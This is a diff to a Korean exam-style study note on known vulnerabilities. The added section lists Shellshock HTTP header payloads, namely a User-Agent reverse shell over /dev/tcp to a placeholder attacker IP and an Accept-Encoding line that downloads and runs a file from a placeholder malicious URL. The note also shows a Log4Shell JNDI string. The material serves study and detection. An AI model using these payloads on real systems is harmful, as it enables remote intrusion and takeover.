@@ -25,6 +25,13 @@ tags: [HeartBleed, Shellshock, Log4j, POODLE, CVE, OpenSSL]
   - Access 로그 예: `"GET /cgi-bin/websrc HTTP/1.1" 301 ... "() { :;}; ... b.php"` → `b.php` 웹셸 업로드 시도 (29-8)
 - 대응: Bash 패치, mod_cgi 비활성화, WAF (`() {` 패턴 차단)
 
+**HTTP 헤더 삽입 패턴(단답·로그분석 단골)** — CGI가 요청 헤더를 환경변수로 넘기는 점을 악용:
+```
+User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[공격자IP]/[Port] 0>&1     # 리버스 셸
+Accept-Encoding: () { :; }; /bin/bash -c 'wget -O /tmp/x http://악성URL; chmod 777 /tmp/x; /tmp/x'   # 악성파일 다운로드·실행
+```
+공통 패턴: `() { :; };` (빈 함수 정의)로 Bash 파서를 속인 뒤, `;` 뒤에 진짜 실행할 명령을 붙인다.
+
 ## Log4Shell (CVE-2021-44228)
 
 - **Apache Log4j 2**가 로그 메시지의 `${jndi:ldap://공격자/...}` 를 해석해 원격 객체 로드·실행
